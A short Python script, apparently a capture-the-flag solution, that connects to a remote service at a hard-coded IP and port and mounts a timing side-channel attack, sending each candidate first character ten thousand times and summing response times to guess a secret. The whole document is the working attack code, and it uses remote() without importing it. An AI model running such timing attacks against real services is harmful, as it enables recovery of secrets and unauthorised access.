import string
from pprint import pprint
from time import time_ns


r = remote("34.107.45.139", 31202)

alphabet = string.ascii_letters+"0123456789"
results = {key: 0 for key in alphabet}
for _ in range(10000):
    for letter in alphabet:
        input_string = letter + '-' * 9
        start = time_ns()
        r.sendline(input_string)
        r.recvline()
        end = time_ns()
        results[letter] += end-start

pprint(results)
